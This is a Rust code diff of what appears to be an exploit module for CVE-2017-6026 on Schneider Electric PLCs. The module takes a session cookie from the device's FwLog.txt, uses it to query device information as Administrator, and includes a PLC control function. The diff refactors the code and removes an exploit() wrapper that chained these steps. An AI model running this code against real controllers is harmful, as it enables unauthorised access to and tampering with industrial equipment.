@@ -13,8 +13,6 @@ pub struct SchneiderDeviceInfo {
     pub mac: String,
     pub firmware: String,
     pub state: String,
-    pub user: String,
-    pub cookie: String,
 }
 
 /// Retrieve the session cookie from the FwLog.txt (CVE-2017-6026). Pass `port = 0` for default (80).
@@ -27,12 +25,9 @@ pub fn get_session_cookie(target_ip: &str, port: u16) -> Option<SchneiderSession
         .build();
 
     let body = match agent.get(&url).call() {
-        Ok(r) => match r.into_string() {
-            Ok(s) => s,
-            Err(_) => {
-                println!("Error reading FwLog response.");
-                return None;
-            }
+        Ok(r) => if let Ok(s) = r.into_string() { s } else {
+            println!("Error reading FwLog response.");
+            return None;
         },
         Err(e) => {
             println!("Error fetching FwLog: {e}");
@@ -111,17 +106,13 @@ pub fn get_device_info(
                 let device_part = data.split(';').next().unwrap_or("").to_string();
                 let mac = device_part
                     .split_whitespace()
-                    .nth(1)
-                    .map(|s| s.trim_start_matches('[').to_string())
-                    .unwrap_or_else(|| "Unknown".to_string());
+                    .nth(1).map_or_else(|| "Unknown".to_string(), |s| s.trim_start_matches('[').to_string());
 
                 let info = SchneiderDeviceInfo {
                     device: device_part.split_whitespace().next().unwrap_or("").to_string(),
                     mac,
                     firmware,
                     state,
-                    user: user.to_string(),
-                    cookie: cookie_value.to_string(),
                 };
 
                 println!("SUCCESS ({user})");
@@ -178,11 +169,3 @@ pub fn control_plc(
     }
 }
 
-/// Run the full CVE-2017-6026 exploit chain. Pass `port = 0` for default (80).
-pub fn exploit(target_ip: &str, port: u16) -> Option<SchneiderDeviceInfo> {
-    let session = get_session_cookie(target_ip, port)?;
-    println!("Booted {} times", session.power_on_count);
-    println!("Cookie: {} ({})", session.cookie_value, session.bootup_time);
-    println!("---");
-    get_device_info(target_ip, port, &session.cookie_value, "Administrator")
-}
